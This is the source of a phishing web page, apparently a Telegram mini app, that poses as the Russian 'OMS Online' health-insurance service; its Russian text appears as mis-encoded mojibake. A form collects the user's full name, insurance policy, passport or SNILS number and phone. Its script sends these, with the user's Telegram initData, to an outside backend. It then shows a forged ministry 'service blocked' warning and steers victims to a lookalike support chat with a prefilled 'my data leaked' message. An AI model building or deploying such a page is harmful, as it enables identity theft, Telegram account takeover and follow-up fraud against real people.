<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–û–ú–° –û–Ω–ª–∞–π–Ω</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { margin: 0; font-family: system-ui, sans-serif; background: linear-gradient(to bottom, #eff6ff, #ffffff); min-height: 100vh; }
    .container { max-width: 480px; margin: 0 auto; padding: 20px; }
    .hidden { display: none !important; }
    .fade { animation: fadeIn 0.5s; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .blink { animation: blink 1.2s infinite; }
    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
    .glitch { animation: glitch 2s infinite; text-shadow: 2px 0 red, -2px 0 cyan; }
    @keyframes glitch {
      0% { transform: translate(0); }
      20% { transform: translate(-2px, 2px); }
      40% { transform: translate(2px, -2px); }
      60% { transform: translate(-2px, 2px); }
      80% { transform: translate(2px, -2px); }
      100% { transform: translate(0); }
    }

    .loader-bar {
      width: 0%;
      height: 100%;
      background: #2563eb;
      transition: width 0.4s ease;
    }
  </style>
</head>
<body class="flex items-center justify-center">

  <div class="container bg-white rounded-2xl shadow-2xl p-8">

    <div id="welcome" class="text-center fade">
      <h1 class="text-3xl font-bold text-blue-800 mb-6">üëã –ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ!</h1>
      <p class="text-lg text-gray-700 mb-8 leading-relaxed">
        –Ø —Ü–∏—Ñ—Ä–æ–≤–æ–π –ø–æ–º–æ—â–Ω–∏–∫ —Å–µ—Ä–≤–∏—Å–∞ ¬´–û–ú–° –û–Ω–ª–∞–π–Ω¬ª.<br><br>
        –ú–æ—è –∑–∞–¥–∞—á–∞ ‚Äî –ø–æ–º–æ–≥–∞—Ç—å –≤–∞–º –±—ã—Å—Ç—Ä–æ –∏ —É–¥–æ–±–Ω–æ...<br><br>
        <b>‚ö†Ô∏è –í–∞–∂–Ω–æ!</b><br>
        –î–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è –º–µ–¥–∏—Ü–∏–Ω—Å–∫–æ–π –ø–æ–º–æ—â–∏ –≤–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –∞–∫—Ç—É–∞–ª—å–Ω—ã.<br>
        –≠—Ç–æ –∑–∞–π–º—ë—Ç –≤—Å–µ–≥–æ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç. üè•‚ú®
      </p>
      <button onclick="show('step1')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-xl font-medium shadow-lg hover:bg-blue-700">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
    </div>

    <div id="step1" class="hidden fade">
      <h2 class="text-2xl font-bold text-center mb-6">–ê–Ω–∫–µ—Ç–∞</h2>
      <h3 class="text-xl font-semibold mb-6">üëá –£–∫–∞–∂–∏—Ç–µ, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –í–∞—à –ø–æ–ª:</h3>
      <div class="grid grid-cols-2 gap-4">
        <button onclick="save('gender', '–ú—É–∂—Å–∫–æ–π'); show('step2')" class="bg-blue-100 py-6 rounded-xl text-lg transition">–ú—É–∂—Å–∫–æ–π</button>
        <button onclick="save('gender', '–ñ–µ–Ω—Å–∫–∏–π'); show('step2')" class="bg-pink-100 py-6 rounded-xl text-lg transition">–ñ–µ–Ω—Å–∫–∏–π</button>
      </div>
    </div>

    <div id="step2" class="hidden fade">
      <h3 class="text-xl font-semibold mb-6">üìù –í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –§–ò–û:</h3>
      <input id="name" type="text" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" />
      <button onclick="saveInput('name', 'step3')" class="w-full bg-blue-600 text-white py-4 rounded-xl">–î–∞–ª–µ–µ</button>
    </div>

    <div id="step3" class="hidden fade">
      <h3 class="text-xl font-semibold mb-6">–ù–æ–º–µ—Ä –í–∞—à–µ–≥–æ —Å—Ç—Ä–∞—Ö–æ–≤–æ–≥–æ –ø–æ–ª–∏—Å–∞:</h3>
      <input id="polis" type="tel" inputmode="numeric" placeholder="0000 0000 0000 0000" maxlength="16" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9]/g, '');" />
      <button onclick="saveInput('polis', 'step4')" class="w-full bg-blue-600 text-white py-4 rounded-xl">–î–∞–ª–µ–µ</button>
    </div>

    <div id="step4" class="hidden fade">
      <h3 class="text-xl font-semibold mb-6">–í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç:</h3>
      <div class="grid grid-cols-2 gap-4">
        <button onclick="setDocType('–ü–∞—Å–ø–æ—Ä—Ç')" class="bg-gray-100 py-6 rounded-xl">–ü–∞—Å–ø–æ—Ä—Ç</button>
        <button onclick="setDocType('–°–ù–ò–õ–°')" class="bg-gray-100 py-6 rounded-xl">–°–ù–ò–õ–°</button>
      </div>
    </div>

    <div id="step5" class="hidden fade">
      <h3 id="docTitle" class="text-xl font-semibold mb-6">–£–∫–∞–∂–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞:</h3>
      <input id="docNumber" type="tel" inputmode="numeric" class="w-full p-4 border rounded-xl text-lg mb-2 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9]/g, '');" />
      <p id="docError" class="text-red-600 text-sm mb-4 hidden"></p>
      <button onclick="validateDoc()" class="w-full bg-blue-600 text-white py-4 rounded-xl">–î–∞–ª–µ–µ</button>
    </div>

    <div id="step6" class="hidden fade">
      <h3 class="text-xl font-semibold mb-6">–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</h3>
      <input id="phone" type="tel" inputmode="numeric" placeholder="+7 (___) ___-__-__" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="formatPhone(this)" maxlength="18" />
      <button onclick="saveInput('phone', 'check')" class="w-full bg-blue-600 text-white py-4 rounded-xl">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
    </div>

    <div id="check" class="hidden fade text-center">
      <h2 class="text-2xl font-bold mb-6">–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–∞–Ω–Ω—ã–µ</h2>
      <div class="bg-gray-50 p-6 rounded-xl mb-6 text-left text-base leading-relaxed">
        <p><b>–ü–æ–ª:</b> <span id="prevGender"></span></p>
        <p><b>–§–ò–û:</b> <span id="prevName"></span></p>
        <p><b>–ü–æ–ª–∏—Å:</b> <span id="prevPolis"></span></p>
        <p><b>–î–æ–∫—É–º–µ–Ω—Ç:</b> <span id="prevDoc"></span></p>
        <p><b>–¢–µ–ª–µ—Ñ–æ–Ω:</b> <span id="prevPhone"></span></p>
      </div>
      <div class="grid grid-cols-2 gap-4">
        <button onclick="show('step6')" class="bg-gray-300 py-4 rounded-xl">–ù–∞–∑–∞–¥</button>
        <button onclick="startFinish()" class="bg-green-600 text-white py-4 rounded-xl font-medium">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
      </div>
    </div>

    <div id="loading" class="hidden fade text-center">
      <h2 class="text-2xl font-bold text-blue-800 mb-8">–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö...</h2>
      <div class="w-full bg-gray-200 h-3 rounded-full overflow-hidden mb-4">
        <div id="progressBar" class="loader-bar"></div>
      </div>
      <p class="text-gray-400 text-sm italic animate-pulse">–ò–¥–µ—Ç —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º –ì–æ—Å—É—Å–ª—É–≥...</p>
    </div>

    <div id="blocked" class="hidden fade text-center bg-red-50 p-8 rounded-2xl border-4 border-red-600">
      <div class="text-6xl text-red-600 blink mb-6">!</div>
      <h1 class="text-2xl font-bold text-red-800 mb-4 glitch">–ú–ò–ù–¶–ò–§–†–´ ‚Äî –û–§–ò–¶–ò–ê–õ–¨–ù–û–ï –£–í–ï–î–û–ú–õ–ï–ù–ò–ï üá∑üá∫</h1>
      <p class="text-lg text-red-700 mb-8 leading-relaxed">
        ‚ö†Ô∏è <b>–í–ù–ò–ú–ê–ù–ò–ï!</b><br><br>
        üö´ <b>–î–∞–Ω–Ω—ã–π —Å–µ—Ä–≤–∏—Å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –ú–∏–Ω–∏—Å—Ç–µ—Ä—Å—Ç–≤–æ–º —Å–≤—è–∑–∏ –∏ –º–∞—Å—Å–æ–≤—ã—Ö –∫–æ–º–º—É–Ω–∏–∫–∞—Ü–∏–π –†–æ—Å—Å–∏–π—Å–∫–æ–π –§–µ–¥–µ—Ä–∞—Ü–∏–∏</b> üö´<br><br>
        –° –≤–∞–º–∏ –≤ —Å–∫–æ—Ä–æ–º –≤—Ä–µ–º–µ–Ω–∏ –¥–æ–ª–∂–Ω—ã —Å–≤—è–∑–∞—Ç—å—Å—è –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª–∏ –ú–∏–Ω—Ü–∏—Ñ—Ä –†–æ—Å—Å–∏–∏.
      </p>
      <a href="https://t.me/mincfr_official?text=–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ!%20–ú–æ–∏%20–¥–∞–Ω–Ω—ã–µ%20–ø–æ–ø–∞–ª–∏%20–≤%20–æ–±—â–∏–π%20–¥–æ—Å—Ç—É–ø!" class="block w-full bg-blue-600 text-white py-4 rounded-xl font-medium">–ü–µ—Ä–µ–π—Ç–∏ –≤ —á–∞—Ç –ø–æ–¥–¥–µ—Ä–∂–∫–∏</a>
    </div>

  </div>

  <script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    let answers = {};

    function show(id) {
      document.querySelectorAll('#welcome, [id^="step"], #check, #loading, #blocked').forEach(el => el.classList.add('hidden'));
      document.getElementById(id).classList.remove('hidden');
      if (id === 'check') {
        document.getElementById('prevGender').textContent = answers.gender || '‚Äî';
        document.getElementById('prevName').textContent = answers.name || '‚Äî';
        document.getElementById('prevPolis').textContent = answers.polis || '‚Äî';
        document.getElementById('prevDoc').textContent = `${answers.docType || '‚Äî'} ${answers.docNumber || '‚Äî'}`;
        document.getElementById('prevPhone').textContent = answers.phone || '‚Äî';
      }
    }

    function save(key, value) { answers[key] = value; }
    function saveInput(id, next) {
      const val = document.getElementById(id).value.trim();
      if (!val) return alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –ø–æ–ª–µ!');
      save(id, val);
      show(next);
    }

    function setDocType(type) {
      save('docType', type);
      const input = document.getElementById('docNumber');
      input.value = '';
      document.getElementById('docTitle').innerText = type === '–ü–∞—Å–ø–æ—Ä—Ç' ? '–£–∫–∞–∂–∏—Ç–µ —Å–µ—Ä–∏—é –∏ –Ω–æ–º–µ—Ä –ø–∞—Å–ø–æ—Ä—Ç–∞:' : '–£–∫–∞–∂–∏—Ç–µ –Ω–æ–º–µ—Ä –°–ù–ò–õ–°:';
      input.maxLength = type === '–ü–∞—Å–ø–æ—Ä—Ç' ? 10 : 11;
      show('step5');
    }

    function validateDoc() {
      const val = document.getElementById('docNumber').value.replace(/\D/g, '');
      const expected = answers.docType === '–ü–∞—Å–ø–æ—Ä—Ç' ? 10 : 11;
      if (val.length !== expected) {
        const error = document.getElementById('docError');
        error.textContent = `–í–≤–µ–¥–∏—Ç–µ ${expected} —Ü–∏—Ñ—Ä`;
        error.classList.remove('hidden');
        return;
      }
      save('docNumber', val);
      show('step6');
    }

    function formatPhone(input) {
      let v = input.value.replace(/\D/g, '');
      if (v.startsWith('7') || v.startsWith('8')) v = v.substring(1);
      let res = '+7';
      if (v.length > 0) res += ' (' + v.substring(0, 3);
      if (v.length > 3) res += ') ' + v.substring(3, 6);
      if (v.length > 6) res += '-' + v.substring(6, 8);
      if (v.length > 8) res += '-' + v.substring(8, 10);
      input.value = res.substring(0, 18);
    }

    // –ò–º–∏—Ç–∞—Ü–∏—è "–ª–∞–≥–∞—é—â–µ–π" –∑–∞–≥—Ä—É–∑–∫–∏
    async function startFinish() {
      show('loading');
      const bar = document.getElementById('progressBar');

      await wait(600);
      bar.style.width = '20%';
      
      await wait(1200); // –î–æ–ª–≥–∏–π —Ñ—Ä–∏–∑
      bar.style.width = '22%'; // –ï–ª–µ —Å–¥–≤–∏–Ω—É–ª–æ—Å—å
      
      await wait(500);
      bar.style.width = '55%'; // –†—ã–≤–æ–∫
      
      await wait(2000); // –û–ø—è—Ç—å –∑–∞–≤–∏—Å–ª–æ –Ω–∞–¥–æ–ª–≥–æ
      bar.style.width = '58%';

      finish(); // –ò —Å—Ä–∞–∑—É –≤—ã–ª–µ—Ç –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏
    }

    function wait(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

    function finish() {
      const payload = { ...answers, initDataRaw: tg.initData };
      fetch('https://oms-mini-app-backend-production.up.railway.app/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
      .finally(() => show('blocked'));
    }
  </script>
</body>
</html>
